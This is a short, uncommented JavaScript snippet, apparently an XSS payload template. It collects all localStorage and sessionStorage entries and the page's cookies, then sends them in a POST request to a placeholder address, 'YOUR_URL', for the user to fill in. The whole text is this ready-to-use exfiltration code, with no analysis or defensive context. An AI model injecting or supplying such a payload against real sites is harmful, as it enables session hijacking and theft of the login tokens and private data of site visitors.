function getStorage(e) {
    return Object.keys(e).map(function (t) {
        return [t, e.getItem(t)]
    })
}
var local = this.getStorage(localStorage),
    session = this.getStorage(sessionStorage),
    cookies = document.cookie,
    xhttp = new XMLHttpRequest;
xhttp.open("POST", "YOUR_URL", !0), xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), xhttp.send("local=" + JSON.stringify(local) + "&sess=" + JSON.stringify(session) + "&cookies=" + cookies);